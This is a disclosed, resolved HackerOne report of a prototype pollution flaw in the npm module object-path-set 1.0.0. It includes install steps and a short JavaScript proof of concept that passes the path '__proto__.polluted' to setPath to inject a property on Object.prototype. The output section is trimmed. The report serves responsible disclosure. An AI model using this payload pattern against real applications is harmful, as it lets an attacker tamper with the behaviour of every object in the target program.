# [H] [object-path-set] Prototype pollution

## Summary
Severity: High
Program: Node.js third-party modules
Weakness: Modification of Assumed-Immutable Data (MAID)
Reporter: d3lla
State: resolved
Disclosed: 2020-08-20T09:08:31.858Z
Source: https://hackerone.com/reports/878332

## Details
I would like to report a `prototype pollution` vulnerability in `object-path-set` module.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** `object-path-set`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/object-path-set`

## Module Description

set values in javascript objects by specifying a path.
if the path doesn't exist yet, it will be created.

## Module Stats

[81] weekly downloads

# Vulnerability

## Vulnerability Description

The `setPath` function can be used to add/modify properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:
- install `object-path-set` module:
    - `npm i object-path-set`

Set the `__proto__.polluted` property of an object:
```javascript

const setPath = require('object-path-set');
const obj = {};
console.log("Before : " + obj.polluted);
setPath({}, '__proto__.polluted', 'yes');
console.log("After : " + obj.polluted);
```
Output:

_Trimmed to 38 lines — full report: https://hackerone.com/reports/878332_
